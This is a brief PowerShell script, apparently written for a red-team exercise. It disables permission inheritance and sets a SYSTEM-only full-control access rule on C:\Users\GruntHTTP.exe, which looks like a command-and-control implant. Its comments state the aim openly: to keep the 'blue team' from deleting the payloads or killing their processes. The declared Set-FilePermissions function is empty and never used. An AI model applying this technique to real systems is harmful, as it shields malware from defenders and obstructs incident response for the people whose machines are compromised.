Function Set-FilePermissions {
	Param(
	$user,
	$folder)
}

$ACL = New-Object System.Security.AccessControl.DirectorySecurity #variable = new object 
$ACL.SetAccessRuleProtection($true,$true) #disables inheritance. true true means off and off

$rule1 = new-object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")

#include current user as having full access as well as the system to have full access
$ACL.SetAccessRule($rule1)
$acl

#Run this command not in ISE. This command sets permissions for specific rules using our script
# Set the ACL for all payloads to prevent blue team from being able to delete and kill the processes
$ACL | Set-Acl -Path C:\Users\GruntHTTP.exe
